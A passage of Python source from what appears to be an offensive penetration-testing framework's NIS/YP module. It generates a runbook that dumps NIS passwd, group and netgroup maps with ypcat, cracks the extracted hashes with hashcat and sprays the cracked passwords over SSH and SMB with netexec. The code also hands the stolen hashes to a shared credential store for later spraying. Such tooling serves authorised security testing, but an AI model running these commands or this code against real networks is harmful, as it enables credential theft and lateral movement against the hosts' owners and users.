                ["CWE-306"], kind="nis_domain_leak",
                exploit_note=(
                    "After foothold on any in-range client: ssh <client> "
                    "'ypcat -d <domain> passwd'  # may succeed where "
                    "direct scan failed."),
                depth_tier="t1"))
    return out


def runbook(ip: str, port: int = _DEFAULT_PORT) -> list[dict]:
    return [
        {"phase": "recon", "tool": "rpcinfo",
         "command": f"rpcinfo -p {ip}",
         "why": "list registered RPC programs — look for 100004/100007/100009/100028"},
        {"phase": "enumerate", "tool": "ypwhich",
         "command": f"ypwhich -d <domain> {ip}",
         "why": "confirm the NIS domain name from a client"},
        {"phase": "enumerate", "tool": "ypcat",
         "command": f"ypcat -d <domain> -h {ip} passwd",
         "why": "dump passwd map (hashes) once the domain is known"},
        {"phase": "enumerate", "tool": "ypcat",
         "command": f"ypcat -d <domain> -h {ip} group ; "
                    f"ypcat -d <domain> -h {ip} netgroup",
         "why": "privilege membership + host/user trust graph"},
        {"phase": "loot", "tool": "hashcat",
         "command": "hashcat -m 1500 loot/nis-<domain>.pw wordlist.txt   "
                    "# -m 500/7400/1800 for md5/sha256/sha512 crypt",
         "why": "crack the extracted hashes offline"},
        {"phase": "chain", "tool": "netexec / hydra",
         "command": "nxc ssh <hosts> -u loot/users.txt -p loot/cracked.txt",
         "why": "spray the cracked passwords across SSH / SMB — same "
                "credential base across the NIS estate"},
    ]


def findings_to_vulns(fs: list[dict]) -> dict:
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "nisyp", _DEFAULT_PORT)


def _handoff_hashes(hosts: list[Host], probes: dict,
                    creds: dict | None) -> int:
    """Feed extracted passwd hashes into the shared credentials store so the
    SSH/telnet/rlogin/SMB spray sees them on the next scan pass. Returns the
    number of Credential objects appended. Best-effort: any absence of the
    credentials store (older tree / unit-test caller) leaves it a no-op."""
    if creds is None or not isinstance(creds, dict):
        return 0
    bucket = creds.setdefault("credentials", [])
    from ..core.models import Credential
    added = 0
    for h in hosts:
        pr = probes.get(h.ip) or {}
        for row in pr.get("passwd_hashes") or []:
            bucket.append(Credential(
                username=row["user"],
                secret=row["hash"],
                kind=f"crypt-{row['hash_format']}",
                source="nisyp",
                origin_ip=h.ip,
                notes=f"NIS domain={pr.get('domain','')} uid={row['uid']}"))
            added += 1
    return added


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None,
            context: dict | None = None) -> dict:
    """Full NIS/YP analysis. `context` may carry `nis_domain_hints` — a list of
    domain-name candidates harvested by other modules (LDAP baseDN, Kerberos
    realm, SMB workgroup, resolv.conf strings) that gets tried before the
    well-known defaults."""
    from . import svcprobe
    targets = nis_targets(hosts)

    # Build once: cross-service domain hints, ordered before per-host names.
    domain_hints: list[str] = []
    if context:
        for k in ("nis_domain_hints", "domain_hints", "kerberos_realm",
                  "smb_workgroup", "ldap_basedn"):
            v = context.get(k) if isinstance(context, dict) else None
            if isinstance(v, str) and v:
                domain_hints.append(v)
            elif isinstance(v, (list, tuple)):
                domain_hints.extend(str(x) for x in v if x)

    # Fast lookup: hostnames per IP so probe() can build the per-host candidate list.
    hostnames_by_ip = {h.ip: list(h.hostnames) for h in hosts}

    probes: dict = {}
    state: dict = {}
    if active:
        def _one(t: dict) -> dict:
            return probe(t["ip"], domain_hints=domain_hints,
                         host_hostnames=hostnames_by_ip.get(t["ip"]))
        for t, pr in svcprobe.iter_probe(targets, _one,
                                         budget=budget, progress=progress,
                                         state=state):
            if pr and pr.get("reachable"):
                probes[t["ip"]] = pr
                t["domain"] = pr.get("domain", "")
                t["hashes"] = len(pr.get("passwd_hashes") or [])
                t["maps"] = len(pr.get("maps") or [])
    added = _handoff_hashes(hosts, probes, creds)
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": probes,
            "stats": {"targets": len(targets), "findings": len(fs),
                      "credentials_added": added,
                      "stopped": state.get("stopped")}}
